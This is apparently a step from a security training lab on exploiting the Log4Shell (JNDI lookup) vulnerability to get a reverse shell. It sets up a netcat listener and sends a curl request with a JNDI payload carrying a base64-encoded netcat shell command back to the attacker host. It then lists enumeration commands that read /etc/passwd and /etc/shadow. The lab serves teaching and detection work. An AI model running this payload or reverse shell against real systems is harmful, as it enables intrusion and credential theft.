# 3 - Upgrade to a Reverse Shell

For this challenge you'll be following the same process with one minor modification. You need to setup a listener for the reverse shell connection and change the payload.

1.  Start by connecting to the **Ubuntu Attacker Endpoint.**
    
2.  Create a new terminal session for the netcat listener:
    
    `screen -S nc`
    
3.  Start netcat as a listener on port **7777**:
    
    `nc -lvp 7777`
    
    **Note:** Netcat (nc) is a networking utility used to establish connections. For now, you can leave that up and listening
    
    -   `-l` = listen mode
    -   `-v` = verbose
    -   `-p` = sets the port
        
4.  Detach from that session by using the button key combinations of `CTRL + A`, let go, and then press `D`.
    
5.  Time to send the upgraded payload!
    
    `curl 172.31.24.20:8080 -H 'X-Api-Version: ${jndi:ldap://172.31.24.10:1389/Basic/Command/Base64/bmMgLW52IDE3Mi4zMS4yNC4xMCA3Nzc3IC1lIC9iaW4vc2g=}'`
    
    **Note:** The Base64 encoded string translates to: `nc -nv 172.31.24.10 7777 /bin/sh`
    
    **Analysis:** The vulnerable application is running an extremely old version of netcat susceptible to sending a shell through the netcat connection. While this works for our test environment to understand the principles of what is taking place, it will most likely fail with a production application.
    
6.  Reattach to the netcat terminal session:
    
    `screen -r nc`
    
7.  You have established a reverse shell! Now an attacker would typically perform some enumeration. Try some of these commands out to see the response:
    
    -   `uname -a`
    -   `whoami`
    -   `env`
    -   `cat /etc/passwd`
    -   `cat /etc/shadow`﻿
        

Feel free to spend a bit more time before moving on to analysis and detection. You can send different payloads by replacing the Base64 string in the curl command.

-   ﻿[CyberChef](https://gchq.github.io/CyberChef/) is a good resource to encode/decode strings.
-   You can also use Linux to:
    -   Encode: `echo -n 'string' | base64`
    -   Or Decode: `echo -n 'NDJpc3RoZWFuc3dlcg==' | base64 --decode`
        

In the next challenge, you will be performing some analysis and taking a look at a detection method.